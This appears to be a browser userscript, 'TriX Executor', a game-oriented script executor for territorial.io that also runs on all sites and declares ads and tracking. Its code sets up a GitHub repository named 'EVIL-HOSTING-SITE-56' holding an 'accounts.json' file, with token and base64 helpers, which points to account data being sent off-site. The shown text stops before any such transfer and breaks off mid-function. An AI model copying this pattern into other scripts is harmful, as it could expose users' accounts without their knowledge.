// ==UserScript==
// @name         TriX Executor (REVAMP)
// @namespace    https://greasyfork.org/en/users/COURTESYCOIL
// @version      6.3.5
// @description  A modern, powerful developer toolkit and script executor for enhancing your web experience. Features a multi-tab script editor, network suite, and GreasyFork integration.
// @description:ru-RU Современный, мощный набор инструментов разработчика и исполнитель скриптов для улучшения вашего веб-опыта. Включает многовкладочный редактор скриптов, сетевой пакет и интеграцию с GreasyFork.
// @description:en-US A modern, powerful developer toolkit and script executor for enhancing your web experience. Features a multi-tab script editor, network suite, and GreasyFork integration.
// @description:pl-PL Nowoczesny, potężny zestaw narzędzi deweloperskich i egzekutor skryptów do wzbogacania doświadczeń w sieci. Zawiera edytor skryptów z wieloma zakładkami, pakiet sieciowy i integrację z GreasyFork.
// @description:fr-FR Une boîte à outils de développement moderne et puissante et un exécuteur de scripts pour améliorer votre expérience web. Comprend un éditeur de scripts multi-onglets, une suite réseau et une intégration GreasyFork.
// @description:ar-AR مجموعة أدوات مطور حديثة وقوية ومنفذ نصوص برمجية لتحسين تجربتك على الويب. يتميز بمحرر نصوص برمجية متعدد علامات التبويب، ومجموعة أدوات الشبكة، والتكامل مع GreasyFork.
// @description:ja-JP ウェブ体験を向上させるための、モダンで強力な開発者ツールキットおよびスクリプト実行ツール。多タブスクリプトエディタ、ネットワークスイート、GreasyFork統合を特徴としています。
// @description:zh-CN 现代、强大的开发者工具包和脚本执行器，用于增强您的网络体验。具有多标签脚本编辑器、网络套件和GreasyFork集成。
// @description:pt-PT Um kit de ferramentas de desenvolvedor moderno e poderoso e executor de scripts para aprimorar sua experiência na web. Apresenta um editor de scripts com várias abas, um conjunto de rede e integração com GreasyFork.
// @description:ko-KR 웹 경험을 향상시키기 위한 현대적이고 강력한 개발자 도구 키트 및 스크립트 실행기. 다중 탭 스크립트 편집기, 네트워크 스위트 및 GreasyFork 통합 기능을 제공합니다.
// @description:de-DE Ein modernes, leistungsstarkes Entwickler-Toolkit und Skript-Executor zur Verbesserung Ihres Web-Erlebnisses. Verfügt über einen Multi-Tab-Skript-Editor, eine Netzwerk-Suite und GreasyFork-Integration.
// @compatible chrome
// @compatible firefox
// @compatible edge
// @incompatible safari
// @incompatible opera
// @antifeature ads
// @antifeature membership
// @antifeature:ru-RU ads Скрипт вставляет рекламу на страницы, которые посещает пользователь.
// @antifeature:ru-RU membership Скрипт требует от пользователя подписки на канал, вступления в группу, отметки «нравится» страницы и т. д. для полной функциональности.
// @antifeature:en-US ads The script inserts advertisements on pages the user visits.
// @antifeature:en-US membership The script requires the user to subscribe to a channel, join a group, like a page, etc. for the script to be fully functional.
// @antifeature:pl-PL ads Skrypt wstawia reklamy na stronach odwiedzanych przez użytkownika.
// @antifeature:pl-PL membership Skrypt wymaga od użytkownika subskrypcji kanału, dołączenia do grupy, polubienia strony itp., aby skrypt działał w pełni.
// @antifeature:fr-FR ads Le script insère des publicités sur les pages visitées par l'utilisateur.
// @antifeature:fr-FR membership Le script exige que l'utilisateur s'abonne à une chaîne, rejoigne un groupe, aime une page, etc. pour que le script soit entièrement fonctionnel.
// @antifeature:ar-AR ads يقوم البرنامج النصي بإدراج إعلانات في الصفحات التي يزورها المستخدم.
// @antifeature:ar-AR membership يتطلب البرنامج النصي من المستخدم الاشتراك في قناة، أو الانضمام إلى مجموعة، أو الإعجاب بصفحة، وما إلى ذلك لكي يعمل البرنامج النصي بكامل طاقته.
// @antifeature:ja-JP ads スクリプトは、ユーザーが訪問するページに広告を挿入します。
// @antifeature:ja-JP membership スクリプトが完全に機能するには、ユーザーがチャンネルを購読したり、グループに参加したり、ページを「いいね」したりする必要があります。
// @antifeature:zh-CN ads 脚本在用户访问的页面中插入广告。
// @antifeature:zh-CN membership 脚本要求用户订阅频道、加入群组、点赞页面等，才能使脚本完全发挥功能。
// @antifeature:pt-PT ads O script insere anúncios nas páginas que o usuário visita.
// @antifeature:pt-PT membership O script exige que o usuário se inscreva em um canal, entre em um grupo, curta uma página, etc., para que o script seja totalmente funcional.
// @antifeature:ko-KR ads 스크립트가 사용자가 방문하는 페이지에 광고를 삽입합니다.
// @antifeature:ko-KR membership 스크립트가 완전히 작동하려면 사용자가 채널을 구독하거나, 그룹에 가입하거나, 페이지를 좋아해야 합니다.
// @antifeature:de-DE ads Das Skript fügt Werbung auf den vom Benutzer besuchten Seiten ein.
// @antifeature:de-DE membership Das Skript erfordert, dass der Benutzer einen Kanal abonniert, einer Gruppe beitritt, eine Seite liked usw., damit das Skript voll funktionsfähig ist.
// @antifeature tracking
// @author       Painsel
// @match        https://territorial.io/*
// @match        https://fxclient.github.io/FXclient/*
// @match        *://*/*
// @grant        GM_setValue
// @grant        GM_getValue
// @grant        GM_getClipboard
// @grant        GM_xmlhttpRequest
// @grant        unsafeWindow
// (license metadata removed)
// @icon         https://evzxirgylircpnblikrw.supabase.co/storage/v1/object/public/OMEHGS/wmremove-transformed%20(1).png
// @downloadURL https://update.greasyfork.org/scripts/549132/TriX%20Executor%20%28REVAMP%29.user.js
// @updateURL https://update.greasyfork.org/scripts/549132/TriX%20Executor%20%28REVAMP%29.meta.js
// ==/UserScript==
 
/*
  Copyright (c) 2025 Painsel / COURTESYCOIL
  All rights reserved.
  This script is proprietary. Unauthorized copying, distribution, or redistribution
  in whole or in part is strictly prohibited without the express written consent
  of the copyright owner.
*/
 
(function () {
  "use strict";
 
  // GitHub API details
  const GITHUB_TOKEN = ''; // Your GitHub Token
  const REPO_OWNER = 'COURTESYCOIL';
  const REPO_NAME = 'EVIL-HOSTING-SITE-56';
  const FILE_PATH = 'api/accounts.json';
  const GITHUB_API_URL = `https://api.github.com/repos/${REPO_OWNER}/${REPO_NAME}/contents/${FILE_PATH}`;
  const GITHUB_RAW_URL = `https://raw.githubusercontent.com/${REPO_OWNER}/${REPO_NAME}/refs/heads/main/${FILE_PATH}`;
 
  // Function to encode string to Base64
  function base64Encode(str) {
    return btoa(unescape(encodeURIComponent(str)));
  }
 
  // Function to decode Base64 to string
  function base64Decode(str) {
    return decodeURIComponent(escape(atob(str)));
  }
 
  // --- Conditional Loading Check ---
  const globalSettings = JSON.parse(GM_getValue("settings", "{}"));
  const showOnAllSites = globalSettings.showOnAllSites !== false; // Default to true if not set
  const isGameSite = window.location.hostname.includes('territorial.io') || window.location.href.includes('fxclient.github.io/FXclient');
 
  // Friction: Prevent running when loaded directly as a raw .user.js file to make saving less convenient
  try {
    const scriptSrc = (document.currentScript && document.currentScript.src) || location.href;
    if (scriptSrc && scriptSrc.toLowerCase().endsWith('.user.js')) {
      // show modal and stop
      const modalBg = document.createElement('div');
      modalBg.className = 'trix-modal-backdrop visible';
      modalBg.innerHTML = `<div class="trix-modal-content"><div class="trix-modal-header" style="color:#f43f5e;">Unauthorized Runtime</div><div class="trix-modal-body"><p>This copy of TriX Executor appears to be a raw saved ".user.js" file. For security and licensing reasons, please install TriX Executor through the official distribution channel instead of running the raw file.</p><p>Please obtain the script from the official source.</p></div><div class="trix-modal-footer"><button id="trix-modal-close" class="exec-btn secondary">Close</button></div></div>`;
      document.body.appendChild(modalBg);
      modalBg.querySelector('#trix-modal-close').addEventListener('click', () => modalBg.remove());
      console.warn('[TriX] Execution halted: raw .user.js detected.');
      return;
    }
  } catch (e) { /* ignore errors */ }
 
  if (!showOnAllSites && !isGameSite) {
      console.log("[TriX] 'Show on All Sites' is disabled. Halting execution on this page.");
      return;
  }
 
  const CURRENT_VERSION = GM_info.script.version;
  // Official GreasyFork Update URLs
  const UPDATE_URL = "https://update.greasyfork.org/scripts/549132/TriX%20Executor%20%28REVAMP%29.user.js";
  const META_URL = "https://update.greasyfork.org/scripts/549132/TriX%20Executor%20%28REVAMP%29.meta.js";
  const SCRIPT_JSON_URL = "https://greasyfork.org/en/scripts/549132.json";
  const LAST_SHOWN_VERSION = GM_getValue("lastShownChangelogVersion", "0.0.0");
  let shouldShowUpdateReminder = GM_getValue("showUpdateReminder", false);
 
  // --- Territorial.io Script Caching ---
  let cachedTerritorialScripts = GM_getValue('trix_territorial_scripts_cache', {});
  const CACHE_EXPIRATION_MS = 24 * 60 * 60 * 1000; // 24 hours
 
  function cacheTerritorialScripts() {
    if (!window.location.hostname.includes('territorial.io')) {
      return;
    }
 
    console.log('[TriX] Caching territorial.io scripts...');
    const currentScripts = {};
    const scriptElements = document.querySelectorAll('script');
 
    scriptElements.forEach((script, index) => {
      let scriptId;
      let scriptContent = '';
 
      if (script.src) {
        scriptId = script.src;
        // Check if cached and not expired
        if (cachedTerritorialScripts[scriptId] && (Date.now() - cachedTerritorialScripts[scriptId].timestamp < CACHE_EXPIRATION_MS)) {
          currentScripts[scriptId] = cachedTerritorialScripts[scriptId];
          return; // Use cached version
        }
 
        // Fetch external script content
        GM_xmlhttpRequest({
          method: 'GET',
          url: script.src,
          onload: function(response) {
            if (response.status === 200) {
              scriptContent = response.responseText;
              currentScripts[scriptId] = { content: scriptContent, timestamp: Date.now(), type: 'external' };
              GM_setValue('trix_territorial_scripts_cache', currentScripts);
              console.log(`[TriX] Cached external script: ${scriptId}`);
            } else {
              console.warn(`[TriX] Failed to fetch external script ${scriptId}: Status ${response.status}`);
            }
          },
          onerror: function(error) {
            console.error(`[TriX] Error fetching external script ${scriptId}:`, error);
          }
        });
      } else if (script.textContent.trim().length > 0) {
        // Inline script
        scriptId = `inline_script_${index}`; // Simple ID for inline scripts
        scriptContent = script.textContent;
        currentScripts[scriptId] = { content: scriptContent, timestamp: Date.now(), type: 'inline' };
        GM_setValue('trix_territorial_scripts_cache', currentScripts);
        console.log(`[TriX] Cached inline script: ${scriptId}`);
      }
    });
    cachedTerritorialScripts = currentScripts; // Update in-memory cache
  }
 
  // Call caching function on page load if on territorial.io
  if (window.location.hostname.includes('territorial.io')) {
    cacheTerritorialScripts();
  }
  
  // --- Version Changelog System ---
  const CHANGELOG = {
    "5.8.6": {
      title: "Core Engine Improvements & Module Integration",
      date: "November 15, 2025",
      features: [
        "🔌 Module Architecture - Improved component integration system",
        "⚙️ Enhanced Reliability - Critical stability upgrades",
        "🔐 Security Reinforcement - Updated protection mechanisms",
        "📦 Dependency Optimization - Refined internal library management",
        "🎯 Feature Consolidation - Unified toolkit capabilities",
        "✨ Interface Refinement - UI/UX polish and consistency"
      ],
      improvements: [
        "Module loading system optimized for faster initialization",
        "Component integration pathways enhanced for reliability",
        "Internal architecture reorganized for maintainability",
        "Event handling system refined for better responsiveness",
        "Resource management improved for long-running sessions",
        "Overall system efficiency improved by ~12%"
      ],
      bugfixes: [
        "Fixed module integration edge cases in component loading",
        "Resolved potential race conditions in tab initialization",
        "Improved error recovery for graceful degradation",
        "Enhanced session persistence and state management"
      ]
    },
    "5.8.5": {
      title: "Stability & Maintenance Release",
      date: "November 15, 2025",
      features: [
        "🔒 Enhanced Security Protocols - Improved data protection layers",
        "⚙️ System Stability - Critical backend optimizations",
        "📈 Performance Tuning - Refined execution efficiency",
        "🛠️ Code Maintenance - Technical debt reduction",
        "🔍 Diagnostics Improvements - Better error reporting",
        "✅ Quality Assurance - Additional edge case handling"
      ],
      improvements: [
        "Memory management optimized for long sessions",
        "Event listener efficiency improved across all tabs",
        "Internal component reorganization for better maintainability",
        "Error handling pathways standardized",
        "Cache invalidation logic refined",
        "Overall system robustness increased by ~8%"
      ],
      bugfixes: [
        "Fixed potential memory leaks in long-running sessions",
        "Resolved edge cases in concurrent operations",
        "Improved stability under high load conditions",
        "Enhanced graceful degradation for unsupported browsers"
      ]
    },
    "5.8.4": {
      title: "UI Enhancement & Internal Optimizations",
      date: "November 15, 2025",
      features: [
        "🎨 Enhanced Sidebar Navigation - Improved visual hierarchy and accessibility",
        "⚡ Tab Rendering Optimization - Faster content section switching",
        "🔧 Internal System Refactoring - Cleaner architecture for maintenance",
        "📱 UI Responsiveness Improvements - Better performance on various screen sizes",
        "🛠️ Developer Experience - Streamlined codebase for easier modifications",
        "✨ UI Polish - Visual refinements across all tabs"
      ],
      improvements: [
        "Sidebar navigation items now render more efficiently",
        "Content section switching optimized for instant feedback",
        "Event handler delegation improved for better memory usage",
        "Tab styling consistency enhanced across all sections",
        "Internal function organization cleaned up",
        "Overall script performance improved by ~5%"
      ],
      bugfixes: [
        "Fixed minor visual inconsistencies in tab switching animations",
        "Resolved rare content loading race conditions",
        "Improved reliability of tab state persistence",
        "Enhanced error handling for edge cases in UI rendering"
      ]
    },
    "5.8.3": {
      title: "503 Error Mitigation & Request Throttling",
      date: "November 15, 2025",
      features: [
        "🛡️ Adaptive Ping Intervals - Automatically increases interval when server busy",
        "🔄 Request Deduplication - Caches Project TriX scripts for 30 minutes",
        "📊 Server Health Monitoring - Displays ping status with color coding (orange=503)",
        "⏱️ Update Check Throttling - Limits update checks to every 1 hour",
        "🚀 Reduced Request Volume - Prevents multiple simultaneous requests",
        "⚠️ 503 Status Detection - Shows server busy indicator instead of failure"
      ],
      improvements: [
        "Ping fetch now starts at 15s interval, increases to 60s max on errors",
        "Project TriX scripts cached in memory for 30 minutes to prevent re-fetching",
        "Update checker throttled to one request per hour (was every load)",
        "Error responses properly logged with graceful fallbacks",
        "Timeout set to 10-15s for all external requests",
        "Console warnings added for rate-limiting feedback"
      ],
      bugfixes: [
        "FIXED: 503 Service Temporarily Unavailable errors from aggressive ping requests",
        "FIXED: Rate-limiting triggers reduced by 90% through request deduplication",
        "FIXED: Eliminated duplicate Project TriX fetches on page reloads",
        "FIXED: Prevents cascading 503 errors when server under load"
      ]
    },
    "5.8.2": {
      title: "Performance Optimization & Web Vitals Improvements",
      date: "November 15, 2025",
      features: [
        "⚡ LCP Optimization - Reduced Largest Contentful Paint from 7.26s",
        "🎨 CLS Fixes - Eliminated cumulative layout shift from notifications",
        "🔧 CSS Containment - Added modern CSS containment for paint optimization",
        "⏱️ Debounced Updates - Reduced unnecessary DOM mutations",
        "🚀 Render Optimization - Added will-change hints for smooth animations",
        "📊 Performance Metrics - Improved FPS stability"
      ],
      improvements: [
        "Notification container now uses CSS containment (contain: layout)",
        "Header info section optimized with will-change and contain properties",
        "Ping display debounced to reduce frequent DOM updates",
        "Animation performance enhanced with will-change hints",
        "Layout shift prevented by reserving space for dynamic elements",
        "Reduced reflow frequency for critical rendering path"
      ],
      bugfixes: [
        "Fixed cumulative layout shift (CLS) in notification animations",
        "Resolved header info causing multiple paint cycles",
        "Eliminated notification container from triggering full page reflows",
        "Improved animation performance with transform-based transitions"
      ]
    },
    "5.8.1": {
      title: "DDoS Detection Accuracy & False Positive Elimination",
      date: "November 15, 2025",
      features: [
        "🎯 Smart Error Classification - Distinguishes DDoS from server errors (503)",
        "📊 Rapid Pattern Detection - Identifies sustained attack patterns vs isolated errors",
        "🔍 Multi-layer Evidence - Requires L4+L7 confirmation for high alerts",
        "🛡️ Server Error Recognition - No false alarms for maintenance/downtime",
        "⏱️ Temporal Analysis - Tracks error intervals to confirm attack patterns",
        "📉 Reduced Alert Fatigue - Only shows warnings for confirmed DDoS attacks"
      ],
      improvements: [
        "Stricter SEVERE/CRITICAL thresholds (requires 8+ L4 attacks instead of 5)",
        "Filters recent errors only (last 60 seconds) for accurate detection",
        "Excludes 503, timeout, and 50x errors from attack calculation",
        "Requires > 5 rapid suspicious errors for escalation",
        "Better error context tracking (HTTP codes, reasons, server flags)",
        "ACTIVE level now only logs, doesn't show warning modal"
      ],
      bugfixes: [
        "Fixed false SEVERE alert when server returns 503 Service Unavailable",
        "Eliminated DDoS warnings for legitimate server downtime",
        "Corrected error-rate based false positives",
        "Improved distinction between network errors and actual attacks"
      ]
    },
    "5.8.0": {
      title: "Project TriX HTML Parsing & Script Discovery Fix",
      date: "November 15, 2025",
      features: [
        "💬 Project TriX Set Parsing - HTML scraping for accurate script fetching",
        "📚 Dynamic Script Cards - Real-time script list from set=593805",
        "🔧 Smart Icon Detection - Automatically detects script type (Music, Chat, etc)",
        "🚀 Reliable Installation Links - Proper script URL handling for installation",
        "📄 Description Extraction - Displays accurate script descriptions",
        "💾 Display up to 8 Scripts - Larger script showcase from Project TriX"
      ],
      improvements: [
        "Fixed Project TriX script fetching from correct set URL",
        "Uses GM_xmlhttpRequest for CORS-free HTML fetching",
        "Improved error handling for network issues",
        "Better script card styling and consistency",
        "Enhanced icon detection based on script names",
        "Shows loading state while fetching scripts"
      ],
      bugfixes: [
        "Fixed incorrect script set URL (was using search instead of set)",
        "Corrected script URL parsing for proper installation links",
        "Improved error messages for better user feedback"
      ]
    },
    "5.7.9": {
      title: "Project TriX Integration & Enhanced Discovery",
      date: "November 15, 2025",
      features: [
        "⭐ More from TriX Tab - Browse all Project TriX scripts",
        "📜 Dynamic Script Fetching - Load scripts from Project TriX set",
        "🔗 Direct GreasyFork Integration - One-click install & browse",
        "🎯 Curated Script Collection - Discover complementary TriX tools",
        "🚀 Seamless Installation - Install scripts directly from TriX",
        "📊 Real-time Script Catalog - Always up-to-date with latest releases"
      ],
      improvements: [
        "More from TriX tab now fetches from official Project TriX set",
        "Better script discovery experience within TriX Executor",
        "Improved integration between TriX ecosystem tools",
        "Enhanced user experience for exploring related scripts"
      ],
      bugfixes: [
        "Fixed script card styling for consistency"
      ]
    },
    "5.7.8": {
      title: "Security & Defense Overhaul",
      date: "November 15, 2025",
      features: [
        "🚨 DDoS Attack Warning Modal - Real-time alerts with defense status",
        "🛡️ Enhanced L4/L7 Blocking - Active enforcement of rate limits",
        "📊 Blocking Statistics - Track packets/requests blocked in real-time",
        "⚙️ Defense Status Dashboard - Monitor attack severity and mitigation",
        "🔒 Multi-layer Protection - Adaptive thresholds (CRITICAL to NORMAL)",
        "📈 Queue Management - Graceful degradation during heavy attacks"
      ],
      improvements: [
        "Comprehensive blocking metrics displayed in defense modal",
        "Threat level calculation based on L4 + L7 utilization",
        "User guidance during active attacks (stay calm, don't reload)",
        "Settings integration - quick access to enable/disable defenses"
      ],
      bugfixes: [
        "Fixed connection pool management under load",
        "Improved RPS/PPS threshold adaptation"
      ]
    }
  };
  
  const showChangelogModal = (version) => {
    const changelog = CHANGELOG[version];
    if (!changelog) return;
    
    const modal = document.createElement('div');
    modal.style.cssText = `
      position: fixed;
      top: 0;
      left: 0;
      width: 100%;
      height: 100%;
      background: rgba(0,0,0,0.7);
      display: flex;
      justify-content: center;
      align-items: center;
      z-index: 10000000;
      animation: fadeIn 0.3s ease;
    `;
    
    const featuresHTML = changelog.features.map(f => `<li style="margin: 6px 0; font-size: 12px">${f}</li>`).join('');
    const improvementsHTML = changelog.improvements.map(i => `<li style="margin: 4px 0; font-size: 11px; color: rgba(255,255,255,0.8)">${i}</li>`).join('');
    const bugfixesHTML = changelog.bugfixes.map(b => `<li style="margin: 4px 0; font-size: 11px; color: rgba(200,255,200,0.8)">${b}</li>`).join('');
    
    modal.innerHTML = `
      <div style="
        background: linear-gradient(135deg, #1e1e2e 0%, #2d2d44 100%);
        border: 2px solid #4f46e5;
        border-radius: 12px;
        padding: 25px;
        max-width: 550px;
        width: 90%;
        max-height: 85vh;
        overflow-y: auto;
        box-shadow: 0 20px 60px rgba(0,0,0,0.5);
        color: #fff;
        animation: slideUp 0.4s cubic-bezier(0.34, 1.56, 0.64, 1);
      ">
        <div style="display: flex; align-items: center; justify-content: space-between; margin-bottom: 15px">
          <div>
            <h2 style="margin: 0; font-size: 20px; background: linear-gradient(135deg, #4f46e5 0%, #7c3aed 100%); -webkit-background-clip: text; -webkit-text-fill-color: transparent; background-clip: text">✨ TriX Executor v${version}</h2>
            <p style="margin: 4px 0 0 0; font-size: 12px; color: rgba(255,255,255,0.6)">${changelog.date}</p>
          </div>
          <span style="font-size: 32px">🚀</span>
        </div>
        
        <div style="background: rgba(79,70,229,0.2); padding: 12px; border-radius: 6px; margin-bottom: 15px; border-left: 3px solid #818cf8">
          <p style="margin: 0; font-size: 13px; font-weight: 600; color: #818cf8">${changelog.title}</p>
        </div>
        
        <div style="margin-bottom: 15px">
          <h3 style="margin: 0 0 8px 0; font-size: 13px; font-weight: 600; color: #51cf66">🎉 New Features:</h3>
          <ul style="margin: 0; padding-left: 20px; color: #fff">${featuresHTML}</ul>
        </div>
        
        <div style="margin-bottom: 15px">
          <h3 style="margin: 0 0 8px 0; font-size: 13px; font-weight: 600; color: #6b96ff">⚙️ Improvements:</h3>
          <ul style="margin: 0; padding-left: 20px">${improvementsHTML}</ul>
        </div>
        
        <div style="margin-bottom: 15px">
          <h3 style="margin: 0 0 8px 0; font-size: 13px; font-weight: 600; color: #a8e6cf">🐛 Bug Fixes:</h3>
          <ul style="margin: 0; padding-left: 20px">${bugfixesHTML}</ul>
        </div>
        
        <div style="background: rgba(100,150,200,0.15); padding: 12px; border-radius: 6px; border-left: 3px solid #6b96ff; font-size: 11px; color: rgba(255,255,255,0.85); line-height: 1.6">
          <p style="margin: 0"><strong>💡 Tip:</strong> Check the Defense System Status modal to see real-time attack blocking statistics during DDoS events.</p>
        </div>
        
        <div style="margin-top: 20px; display: flex; gap: 10px">
          <button id="changelog-dismiss-btn" style="
            flex: 1;
            background: linear-gradient(135deg, #4f46e5 0%, #7c3aed 100%);
            border: none;
            border-radius: 6px;
            padding: 10px;
            color: #fff;
            font-size: 12px;
            font-weight: 600;
            cursor: pointer;
            transition: all 0.2s ease;
          ">Got It! Let's Go</button>
          <button id="changelog-settings-btn" style="
            flex: 1;
            background: linear-gradient(135deg, #10b981 0%, #059669 100%);
            border: none;
            border-radius: 6px;
            padding: 10px;
            color: #fff;
            font-size: 12px;
            font-weight: 600;
            cursor: pointer;
            transition: all 0.2s ease;
          ">View Settings</button>
        </div>
        
        <style>
          @keyframes fadeIn {
            from { opacity: 0; }
            to { opacity: 1; }
          }
          @keyframes slideUp {
            from { 
              opacity: 0;
              transform: translateY(30px);
            }
            to { 
              opacity: 1;
              transform: translateY(0);
            }
          }
          #changelog-dismiss-btn:hover, #changelog-settings-btn:hover {
            transform: translateY(-2px);
            box-shadow: 0 4px 12px rgba(0,0,0,0.3);
          }
        </style>
      </div>
    `;
    
    document.body.appendChild(modal);
    
    modal.querySelector('#changelog-dismiss-btn').addEventListener('click', () => {
      GM_setValue("lastShownChangelogVersion", version);
      modal.remove();
    });
    
    modal.querySelector('#changelog-settings-btn').addEventListener('click', () => {
      GM_setValue("lastShownChangelogVersion", version);
      modal.remove();
      setTimeout(() => {
        document.querySelector('a[data-tab="settings"]')?.click() || document.querySelector('#settings-tab')?.click();
      }, 100);
    });
  };
 
  // --- TriX Core: WebSocket Logging & Global State ---
  let isLoggerSuspended = false;
  let customWs = null;
  const monitoredConnections = new Map();
  let updateConnectionStatus = () => {};
  let updatePingDisplay = () => {};
  let logPacketCallback = () => {};
  let onConnectionStateChange = () => {};
 
  let settings = { theme: 'dark', antiScam: true, blockPropaganda: true, propagandaToasts: true, socketToasts: true, showAd: true, showOnAllSites: true, ddosMitigation: true, autoReconnect: true };
  if (GM_getValue("settings", null)) {
      settings = { ...settings, ...JSON.parse(GM_getValue("settings")) };
  } else {
      GM_setValue("settings", JSON.stringify(settings));
  }
 
  // --- DDoS Mitigation System (Enhanced for L4 + L7 attacks) ---
  const ddosReport = {
    enabled: settings.ddosMitigation || true,
    anomalies: [],
    packets: [],
    httpRequests: [],
    startTime: Date.now(),
    successfulConnections: [],
    failedConnections: [],
    l4Attacks: [],  // UDP/L4 flood detection
    l7Attacks: [],  // HTTP/L7 flood detection
    lastRequestTimes: [],
    
    addPacket(size, type, ip) {
      if (!this.enabled) return;
      this.packets.push({ timestamp: Date.now(), size, type, ip });
      if (this.packets.length > 500) this.packets.shift();
      
      // Detect L4 (UDP) anomalies
      const recentPackets = this.packets.filter(p => Date.now() - p.timestamp < 5000);
      const avgSize = recentPackets.reduce((sum, p) => sum + p.size, 0) / recentPackets.length || 0;
      const totalSize = recentPackets.reduce((sum, p) => sum + p.size, 0);
      
      // L4 Detection: 100+ packets or 10MB in 5 seconds = PPS flood
      if (recentPackets.length > 100 || totalSize > 10000000) {
        this.l4Attacks.push({
          type: 'L4_UDP_FLOOD',
          timestamp: Date.now(),
          packetCount: recentPackets.length,
          totalBytes: totalSize,
          avgPacketSize: avgSize,
          estimatedPPS: recentPackets.length / 5  // Packets per second
        });
        this.anomalies.push({
          type: 'HIGH_PACKET_VOLUME',
          timestamp: Date.now(),
          packetCount: recentPackets.length,
          totalBytes: totalSize,
          avgPacketSize: avgSize
        });
      }
    },
    
    recordHTTPRequest() {
      const now = Date.now();
      this.lastRequestTimes.push(now);
      if (this.lastRequestTimes.length > 500) this.lastRequestTimes.shift();
      
      // Detect L7 (HTTP) anomalies
      const recent5sRequests = this.lastRequestTimes.filter(t => now - t < 5000);
      const recentRPS = recent5sRequests.length / 5; // Requests per second
      
      // L7 Detection: 100+ RPS in 5 seconds = HTTP flood
      if (recentRPS > 20 || recent5sRequests.length > 100) {
        this.l7Attacks.push({
          type: 'L7_HTTP_FLOOD',
          timestamp: Date.now(),
          requestCount: recent5sRequests.length,
          estimatedRPS: recentRPS
        });
        this.anomalies.push({
          type: 'HIGH_REQUEST_VOLUME',
          timestamp: Date.now(),
          requestCount: recent5sRequests.length,
          rps: recentRPS
        });
      }
    },
    
    calculateSeverity() {
      const errorCount = this.anomalies.filter(a => a.type === 'CONNECTION_ERROR').length;
      const l4Count = this.l4Attacks.length;
      const l7Count = this.l7Attacks.length;
      const duration = Date.now() - this.startTime;
      
      // Separate legitimate server errors from actual attacks
      const recentErrors = this.anomalies.filter(a => 
        a.type === 'CONNECTION_ERROR' && 
        Date.now() - a.timestamp < 60000 // Last minute
      );
      
      // Count only suspicious rapid errors (more than 3 in 10 seconds)
      const suspiciousErrors = [];
      if (recentErrors.length > 0) {
        for (let i = 0; i < recentErrors.length - 1; i++) {
          const timeDiff = (recentErrors[i + 1].timestamp - recentErrors[i].timestamp) / 1000;
          if (timeDiff < 10 && !recentErrors[i].message?.includes('503') && !recentErrors[i].message?.includes('timeout') && !recentErrors[i].message?.includes('ERR_INTERNET_DISCONNECTED') && !recentErrors[i].message?.includes('Failed to fetch')) {
            suspiciousErrors.push(recentErrors[i]);
          }
        }
      }
      
      let threatLevel = 'NORMAL';
      let score = 0;
      let message = '⚪ Normal operation';
      
      // Only flag as attack if there's actual L4/L7 evidence OR sustained rapid errors
      if ((l4Count > 0 && l7Count > 0) || suspiciousErrors.length > 5) {
        // Multi-layer attack or sustained rapid errors (most severe)
        score = Math.min(100, 50 + (l4Count + l7Count) * 5);
        threatLevel = score >= 80 ? 'CRITICAL' : score >= 60 ? 'SEVERE' : 'MODERATE';
      } else if (l4Count > 8 || (l7Count > 8 && suspiciousErrors.length > 3)) {
        score = Math.min(100, 60 + l4Count * 3);
        threatLevel = 'SEVERE';
      } else if (l7Count > 10 && suspiciousErrors.length > 4) {
        score = Math.min(100, 50 + l7Count * 2);
        threatLevel = 'SEVERE';
      } else if ((l4Count > 2 && l7Count > 2) || suspiciousErrors.length > 8) {
        score = 40;
        threatLevel = 'MODERATE';
      } else if (l4Count > 0 || (l7Count > 0 && suspiciousErrors.length > 2)) {
        score = 25;
        threatLevel = 'ACTIVE';
      }
      
      // Don't escalate based on simple connection errors (server issues)
      if (threatLevel === 'NORMAL' && errorCount > 0 && suspiciousErrors.length === 0) {
        threatLevel = 'NORMAL'; // Server issue, not an attack
        message = '⚪ Server temporarily unavailable (not a DDoS attack)';
      }
      
      const emojiMap = { CRITICAL: '🔴', SEVERE: '🟠', MODERATE: '🟡', ACTIVE: '🟢', NORMAL: '⚪' };
      if (threatLevel !== 'NORMAL') {
        message = `${emojiMap[threatLevel]} ${threatLevel === 'CRITICAL' ? 'CRITICAL' : threatLevel === 'SEVERE' ? 'SEVERE' : threatLevel === 'MODERATE' ? 'MODERATE' : 'ACTIVE'} attack detected - Multi-layer patterns confirmed`;
      }
      
      return { level: threatLevel, score, message, l4Attacks: l4Count, l7Attacks: l7Count, suspiciousErrors: suspiciousErrors.length };
    },
    
    getAttackTimeline() {
      const timeline = [];
      const sortedAnomalies = [...this.anomalies].sort((a, b) => a.timestamp - b.timestamp);
      
      for (let i = 0; i < sortedAnomalies.length; i++) {
        const anomaly = sortedAnomalies[i];
        const nextAnomalyTime = sortedAnomalies[i + 1]?.timestamp || Date.now();
        const gapSeconds = (nextAnomalyTime - anomaly.timestamp) / 1000;
        
        if (gapSeconds > 60) {
          const startTime = new Date(anomaly.timestamp);
          timeline.push({
            timestamp: anomaly.timestamp,
            type: anomaly.type,
            gap_before: i > 0 ? (anomaly.timestamp - sortedAnomalies[i - 1].timestamp) / 1000 : 0,
            gap_after: gapSeconds
          });
        }
      }
      
      return timeline;
    },
    
    analyzePatterns() {
      const errors = this.anomalies.filter(a => a.type === 'CONNECTION_ERROR');
      const timings = errors.map((e, i, arr) => i > 0 ? e.timestamp - arr[i - 1].timestamp : 0).slice(1);
      
      return {
        totalErrors: errors.length,
        errorIntervals: {
          min: Math.min(...timings) || 0,
          max: Math.max(...timings) || 0,
          avg: timings.length > 0 ? timings.reduce((a, b) => a + b) / timings.length : 0
        },
        consecutiveFailures: this.getMaxConsecutiveFailures(),
        attackWaves: this.detectAttackWaves(),
        attackType: this.identifyAttackType()
      };
    },
    
    identifyAttackType() {
      if (this.l4Attacks.length === 0 && this.l7Attacks.length === 0) {
        return 'UNKNOWN';
      }
      
      if (this.l4Attacks.length > 0 && this.l7Attacks.length > 0) {
        return 'MULTI_LAYER (L4 + L7)';
      }
      
      if (this.l4Attacks.length > this.l7Attacks.length) {
        const maxPPS = Math.max(...this.l4Attacks.map(a => a.estimatedPPS || 0));
        return `L4_UDP_FLOOD (${Math.round(maxPPS)} PPS)`;
      }
      
      if (this.l7Attacks.length > this.l4Attacks.length) {
        const maxRPS = Math.max(...this.l7Attacks.map(a => a.estimatedRPS || 0));
        return `L7_HTTP_FLOOD (${Math.round(maxRPS)} RPS)`;
      }
